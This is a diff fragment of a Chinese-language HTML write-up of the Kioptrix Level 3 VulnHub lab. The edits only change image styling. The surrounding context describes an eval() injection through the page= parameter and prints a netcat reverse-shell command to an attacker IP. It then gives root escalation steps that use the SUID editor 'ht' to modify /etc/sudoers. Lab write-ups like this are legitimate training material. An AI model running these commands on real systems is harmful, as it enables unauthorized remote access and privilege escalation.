@@ -172,7 +172,7 @@ Router() 函数中将 page= 参数传入 eval()，导致可以构造恶意输入
 
 ?&gt;
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963"><img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963" style="max-width: 100%; height: auto; max-height: 1039px;; aspect-ratio: 1919 / 1039; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963"><img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963" style="max-width: 100%; height: auto; max-height: 1039px;; aspect-ratio: 1919 / 1039; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 <p>这里回弹shell需要使用 <code class="notranslate">nc 10.10.14.8 4444 -e /bin/bash</code></p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/KioptrixVM3]
 └─$ sudo nc -lvnp 4444
@@ -186,7 +186,7 @@ bash
 <p>在检索suid程序的时候检索到一个非默认程序/usr/local/bin/ht<br>
 前提是使用python把交互环境配置好<br>
 这是一个编辑程序可以直接使用它修改一下root的文件，可以在网上搜一下怎么使用的，打开之后按F3，输入/etc/sudoers，再编辑，再按F2保存，再按F10退出<br>
-<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e"><img width="1605" height="678" alt="Image" src="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e" style="max-width: 100%; height: auto; max-height: 678px;; aspect-ratio: 1605 / 678; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e"><img width="1605" height="678" alt="Image" src="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e" style="max-width: 100%; height: auto; max-height: 678px;; aspect-ratio: 1605 / 678; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
 <pre class="notranslate"><code class="notranslate">www-data@Kioptrix3:/home/www/kioptrix3.com$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@Kioptrix3:/home/www/kioptrix3.com$ ls
